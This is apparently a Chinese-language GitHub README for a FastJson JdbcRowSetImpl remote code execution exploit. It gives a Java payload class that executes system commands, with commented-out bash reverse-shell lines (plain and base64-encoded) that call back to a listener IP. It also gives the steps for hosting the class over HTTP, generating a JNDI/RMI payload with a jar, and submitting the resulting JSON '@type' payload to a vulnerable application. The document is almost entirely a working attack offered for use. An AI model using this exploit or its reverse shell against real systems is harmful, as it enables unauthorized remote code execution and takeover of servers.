https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE

## 漏洞利用

### 在CommandObject.java类中的commands数组中构造想要执行的命令

### 编译 javac CommandObject.java

```
import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"}; //Command
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
```

[![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/images/3.jpg?raw=true)](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/3.jpg?raw=true)

## 漏洞利用

### 开启一个HTTP服务，并且开启 RMIServer

### 如：

```
Python2 -m SimpleHTTPServer 80
Python3 -m http.server 80
```

### 生成Payload

```
java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RMI端口
```

### FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar 会生成一串Json Payload

[![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/master/images/4.jpg?raw=true)](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/4.jpg?raw=true)

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
```

### 把它Copy到漏洞环境的input中，然后submit进行攻击。